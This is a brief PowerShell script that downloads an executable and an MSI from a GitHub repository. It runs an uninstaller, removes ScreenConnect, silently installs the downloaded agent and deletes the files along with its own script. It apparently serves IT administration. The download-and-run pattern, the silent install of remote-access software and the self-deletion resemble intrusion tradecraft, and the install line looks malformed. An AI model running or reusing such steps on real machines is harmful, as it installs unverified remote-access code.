Invoke-WebRequest -Uri "https://github.com/nightlynx/furry-adventure/raw/main/Agent_Uninstall.exe" -Outfile "C:\Agent_Uninstall.exe"
Invoke-WebRequest -Uri "https://github.com/nightlynx/furry-adventure/raw/main/Agent_Install_COPR.MSI" -Outfile "C:\Agent_Install_COPR.MSI"

powershell.exe start-process -filepath "C:\Agent_Uninstall.exe" -Wait
wmic product where "Name like '%%ScreenConnect%%'" call uninstall /nointeractive
Start-Sleep -Seconds 60
powershell.exe start-process -filepath "C:\Agent_Install_COPR.MSI /qn" -Wait

Remove-Item "C:\Agent_Uninstall.exe"
Remove-Item "C:\Agent_Install_COPR.MSI"
Remove-Item "C:\Agent_Install_COPR.ps1"
